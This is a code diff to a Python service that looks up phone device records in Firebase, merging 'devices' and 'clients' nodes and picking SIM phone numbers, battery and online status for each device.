@@ -1,3 +1,4 @@
+from typing import Any
 from urllib.parse import urlparse
 
 import httpx
@@ -273,6 +274,31 @@ def _join_firebase_path(prefix: str, key: str) -> str:
     return str(key)
 
 
+def _leaf_device_id(name: str | None, firebase_key: str | None = None) -> str | None:
+    text = (firebase_key or name or "").strip().strip("/")
+    if not text:
+        return None
+    return text.split("/")[-1]
+
+
+def _merge_device_records(device_id: str, *records: dict | None) -> dict | None:
+    merged: dict[str, Any] = {}
+    for record in records:
+        if not record:
+            continue
+        raw = record.get("raw")
+        if isinstance(raw, dict):
+            merged.update(raw)
+        for field in ("battery", "battery_level", "status", "online", "model", "phone_number"):
+            if record.get(field) is not None:
+                merged[field] = record.get(field)
+    if not any(records):
+        return None
+    if not merged:
+        return None
+    return _build_device_record(device_id, merged, prefix="")
+
+
 def _build_device_record(key: str, value: dict, prefix: str) -> dict:
     # Node key (e.g. f0577ffa536dde46) is the canonical device id for /fdy lookup.
     name = str(key)
@@ -283,12 +309,16 @@ def _build_device_record(key: str, value: dict, prefix: str) -> dict:
         or value.get("device")
         or key
     )
-    from app.sim_slots import build_sim_slots_from_record
+    from app.sim_slots import build_sim_slots_from_record, is_usable_phone
 
-    phone = value.get("phone") or value.get("phone_number") or value.get("mobile") or value.get("number")
-    status = value.get("status") or value.get("online")
     sims = build_sim_slots_from_record(value)
-    if not sims and phone:
+    phone = None
+    if sims and is_usable_phone(sims[0].get("number")):
+        phone = sims[0].get("number")
+    else:
+        phone = value.get("phone") or value.get("phone_number") or value.get("mobile") or value.get("number")
+    status = value.get("status") or value.get("online")
+    if not sims and phone and is_usable_phone(str(phone)):
         sims = [
             {"slot": 1, "index": 0, "carrier": value.get("carrier1", "SIM 1"), "number": str(phone)},
         ]
@@ -311,6 +341,13 @@ def _build_device_record(key: str, value: dict, prefix: str) -> dict:
                 "online",
                 "last_seen",
                 "model",
+                "action",
+                "actions",
+                "command",
+                "commands",
+                "sms",
+                "smsCommand",
+                "webhookEvent",
             )
         ):
             pass
@@ -417,9 +454,24 @@ async def fetch_firebase_device_live(
 ) -> dict | None:
     """Fetch one device node live from Firebase (battery, sims, online)."""
     root = firebase_root_url(firebase_url)
+    device_id = _leaf_device_id(device_name, firebase_key)
+    if device_id:
+        devices_record = await _fetch_device_node(root, f"devices/{device_id}", timeout)
+        clients_record = await _fetch_device_node(root, f"clients/{device_id}", timeout)
+        merged = _merge_device_records(device_id, devices_record, clients_record)
+        if merged:
+            return merged
+
     if device_name and not firebase_key:
         found = await fast_find_device_in_url(firebase_url, device_name, timeout=timeout)
         if found:
+            leaf = _leaf_device_id(device_name, found.get("firebase_key"))
+            if leaf and leaf != device_id:
+                devices_record = await _fetch_device_node(root, f"devices/{leaf}", timeout)
+                clients_record = await _fetch_device_node(root, f"clients/{leaf}", timeout)
+                merged = _merge_device_records(leaf, devices_record, clients_record)
+                if merged:
+                    return merged
             return found
 
     candidates: list[str] = []
